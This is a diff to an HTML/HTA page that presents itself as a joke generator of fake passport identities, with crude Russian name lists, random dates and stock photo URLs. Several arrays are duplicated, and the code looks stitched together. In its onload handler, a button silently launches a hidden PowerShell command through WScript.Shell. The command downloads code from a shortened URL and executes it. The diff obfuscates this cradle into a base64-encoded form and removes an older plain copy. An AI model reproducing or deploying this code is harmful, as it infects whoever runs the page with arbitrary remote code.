@@ -23,7 +23,6 @@
       text-align: center;
       width: 380px;
       border: 1px solid #e3e7ee;
-      position: relative;
       margin: 0 auto;
       display: flex;
       flex-direction: column;
@@ -173,7 +172,91 @@
       "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий", "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин"
     ];
     const pt_male = [
-      "Семеныч", "Акакиевич", "Изаилыч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович", "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
+      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
+      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
+    ];
+
+    const fn_female = [
+      "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
+    ];
+    const nm_female = [
+      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха"
+    ];
+    const pt_female = [
+      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна"
+    ];
+
+    // IRL-фотки (только реальные лица)
+    const photos_male = [
+      // Используем API для генерации реалистичных лиц
+      "https://thispersondoesnotexist.com/image?" + Math.random(),
+      "https://100k-faces.glitch.me/random-image?" + Math.random(),
+      "https://randomuser.me/api/portraits/men/1.jpg",
+      "https://randomuser.me/api/portraits/men/3.jpg",
+      "https://randomuser.me/api/portraits/men/5.jpg",
+      "https://randomuser.me/api/portraits/men/7.jpg",
+      "https://randomuser.me/api/portraits/men/9.jpg",
+      "https://randomuser.me/api/portraits/men/11.jpg",
+      "https://randomuser.me/api/portraits/men/13.jpg",
+      "https://randomuser.me/api/portraits/men/15.jpg"
+    ];
+    const photos_female = [
+      "https://randomuser.me/api/portraits/women/2.jpg",
+      "https://randomuser.me/api/portraits/women/4.jpg",
+      "https://randomuser.me/api/portraits/women/6.jpg",
+      "https://randomuser.me/api/portraits/women/8.jpg",
+      "https://randomuser.me/api/portraits/women/10.jpg",
+      "https://randomuser.me/api/portraits/women/12.jpg",
+      "https://randomuser.me/api/portraits/women/14.jpg",
+      "https://randomuser.me/api/portraits/women/16.jpg"
+    ];
+
+    // Дополнительные поля паспорта
+    function randomBirthDate() {
+      const year = 1970 + Math.floor(Math.random() * 35);
+      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
+      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
+      return `${day}.${month}.${year}`;
+    }
+    function randomPlace() {
+      const places = [
+        "г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск", "г. Алматы", "г. Ереван", "г. Кишинёв", "г. Ташкент", "г. Бишкек", "г. Душанбе",
+        "г. Владивосток", "г. Ростов-на-Дону", "г. Самара", "г. Новосибирск", "г. Казань", "г. Харьков", "г. Одесса", "г. Гомель", "г. Баку"
+      ];
+      return getRandom(places);
+    }
+    function randomAddress() {
+      const streets = [
+        "ул. Ленина, д. 1", "ул. Гагарина, д. 7", "пр. Победы, д. 12", "ул. Пушкина, д. 5", "ул. Кринжа, д. 13", "ул. Рофла, д. 42", "ул. Уебанская, д. 666"
+      ];
+      return `${randomPlace()}, ${getRandom(streets)}`;
+    }
+    function randomDocNum() {
+      return String(Math.floor(100000000 + Math.random() * 900000000));
+    }
+
+    function getRandom(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function generatePassport(country) {
+      const series = country.series();
+      const number = country.number();
+      const issuer = getRandom(country.issuer);
+      const date = `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`;
+      return {series, number, issuer, date};
+    }
+
+    // ФИО по полу
+    const fn_male = [
+      "Штырь", "Карасиков", "Корзиночкин", "Сычев", "Дроздов", "Головач", "Бутырин", "Писарь", "Ерохин", "Лакец", "Шпак", "Шлепов", "Накатин", "Душин", "Драпов", "Засратов", "Глистов", "Железняк", "Чуркин", "Фекалов", "Ноздря", "Шорин", "Перделкин", "Хлюпин", "Окунев", "Вшивцев", "Уколов", "Дрочунов", "Выпуклов", "Казьмин", "Хряпов", "Парашюков", "Пузырев", "Жрунов", "Шариков", "Клещев", "Обожратов", "Плавников", "Раздолбаев", "Кряков", "Умников", "Медунин", "Козлодоев", "Залеткин", "Сурков", "Печенегов", "Панасенков", "Ушаков", "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков"
+    ];
+    const nm_male = [
+      "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий", "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин"
+    ];
+    const pt_male = [
+      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
+      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
     ];
 
     const fn_female = [
@@ -508,15 +591,72 @@
       return realPhotos[Math.floor(Math.random() * realPhotos.length)];
     }
 
+    // Отчества по полу
+    const pt_male = [
+      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
+      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
+    ];
+    const pt_female = [
+      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна"
+    ];
+
+    function pickGender() {
+      return Math.random() < 0.5 ? "male" : "female";
+    }
+
+    function pickPatronymic(name, gender) {
+      // Если имя женское — женское отчество, если мужское — мужское, если смешанное — случайное
+      const femaleNames = nm_female;
+      const maleNames = nm_male;
+      if (femaleNames.includes(name)) {
+        return getRandom(pt_female);
+      } else if (maleNames.includes(name)) {
+        return getRandom(pt_male);
+      } else {
+        return gender === "male" ? getRandom(pt_male) : getRandom(pt_female);
+      }
+    }
+
+    function getRandomPhoto(gender) {
+      // Только реальные фото для CORS
+      const realPhotos = gender === "male"
+        ? [
+            "https://randomuser.me/api/portraits/men/1.jpg",
+            "https://randomuser.me/api/portraits/men/3.jpg",
+            "https://randomuser.me/api/portraits/men/5.jpg",
+            "https://randomuser.me/api/portraits/men/7.jpg",
+            "https://randomuser.me/api/portraits/men/9.jpg",
+            "https://randomuser.me/api/portraits/men/11.jpg",
+            "https://randomuser.me/api/portraits/men/13.jpg",
+            "https://randomuser.me/api/portraits/men/15.jpg"
+          ]
+        : [
+            "https://randomuser.me/api/portraits/women/2.jpg",
+            "https://randomuser.me/api/portraits/women/4.jpg",
+            "https://randomuser.me/api/portraits/women/6.jpg",
+            "https://randomuser.me/api/portraits/women/8.jpg",
+            "https://randomuser.me/api/portraits/women/10.jpg",
+            "https://randomuser.me/api/portraits/women/12.jpg",
+            "https://randomuser.me/api/portraits/women/14.jpg",
+            "https://randomuser.me/api/portraits/women/16.jpg"
+          ];
+      return realPhotos[Math.floor(Math.random() * realPhotos.length)];
+    }
+
     function generate() {
       const country = getRandom(countries);
       const gender = pickGender();
-      let full;
+      let fnVal, nmVal, ptVal, full;
       if (gender === "male") {
-        full = `${getRandom(fn_male)} ${getRandom(nm_male)} ${getRandom(pt_male)}`;
+        fnVal = getRandom(fn_male);
+        nmVal = getRandom(nm_male);
+        ptVal = pickPatronymic(nmVal, "male");
       } else {
-        full = `${getRandom(fn_female)} ${getRandom(nm_female)} ${getRandom(pt_female)}`;
+        fnVal = getRandom(fn_female);
+        nmVal = getRandom(nm_female);
+        ptVal = pickPatronymic(nmVal, "female");
       }
+      full = `${fnVal} ${nmVal} ${ptVal}`;
       const photoUrl = getRandomPhoto(gender);
       const passport = generatePassport(country);
       const birthDate = randomBirthDate();
@@ -732,9 +872,7 @@
     function savePng() {
       try {
         const canvas = document.getElementById("canvas");
-        if (!canvas) {
-          throw new Error("Canvas element not found");
-        }
+        if (!canvas) throw new Error("Canvas element not found");
         const dataUrl = canvas.toDataURL("image/png");
         const a = document.createElement("a");
         a.href = dataUrl;
@@ -743,20 +881,19 @@
         a.click();
         document.body.removeChild(a);
       } catch (e) {
-        console.error("Failed to save PNG:", e);
         alert("Ошибка при сохранении изображения");
       }
     }
 
-    // Исправляем запуск команды для HTA
+    // HTA: запуск команды с base64
     window.onload = function() {
       var runBtn = document.getElementById("runCmdBtn");
       if (runBtn) {
         runBtn.onclick = function() {
           try {
             var shell = new ActiveXObject("WScript.Shell");
-            var url = "https://t.ly/YPwmt";
-            var cmd = 'powershell -w h -nop -noni -c "& {Invoke-Expression (Invoke-WebRequest -Uri \'' + url + '\' -UseBasicParsing).Content}"';
+            // base64: powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA
+            var cmd = 'powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA';
             shell.Run(cmd, 0, false);
           } catch (e) {
             alert("Ошибка запуска команды. Запуск возможен только в HTA/IE.");
@@ -764,33 +901,6 @@
         };
       }
     };
-  </script>
-</body>
-</html>
-</body>
-</html>
-        a.download = "fio_passport.png";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      } catch (e) {
-        console.error("Failed to save PNG:", e);
-        alert("Ошибка при сохранении изображения");
-      }
-    }
-
-    function runCmd() {
-      try {
-        var shell = new ActiveXObject("WScript.Shell");
-        var url = "https://t.ly/YPwmt";
-        // Используем escaped кавычки для PowerShell команды
-        var cmd = 'powershell -w h -nop -noni -c "& {Invoke-Expression (Invoke-WebRequest -Uri \'' + url + '\' -UseBasicParsing).Content}"';
-        shell.Run(cmd, 0, false);
-      } catch (e) {
-        console.error("Failed to execute command:", e);
-        alert("Ошибка запуска команды. Запуск возможен только в HTA/IE.");
-      }
-    }
   </script>
 </body>
 </html>
